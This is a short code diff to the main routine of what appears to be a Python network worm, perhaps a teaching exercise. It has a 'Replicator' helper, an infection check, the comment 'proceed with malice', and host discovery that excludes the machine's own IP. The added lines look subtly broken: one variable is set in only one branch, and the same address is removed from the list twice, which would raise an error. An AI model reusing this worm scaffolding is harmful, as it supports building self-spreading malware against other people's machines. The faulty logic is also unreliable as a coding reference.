@@ -30,6 +30,8 @@ def main(argv):
 		# Otherwise, proceed with malice.
 		if Replicator.isInfectedSystem():
 			sys.exit(0)
+	else:
+		hostSystem = Replicator.getMyIp()
 
 	# TODO: Get the IP of the current system
 	currentIp = Replicator.getMyIp()
@@ -40,6 +42,7 @@ def main(argv):
 	# TODO: Remove the IP of the current system
 	# from the list of discovered systems (we
 	# do not want to target ourselves!).
+	networkHosts.remove(hostSystem)
 	networkHosts.remove(currentIp)
 
 	print("Found hosts: ", networkHosts)
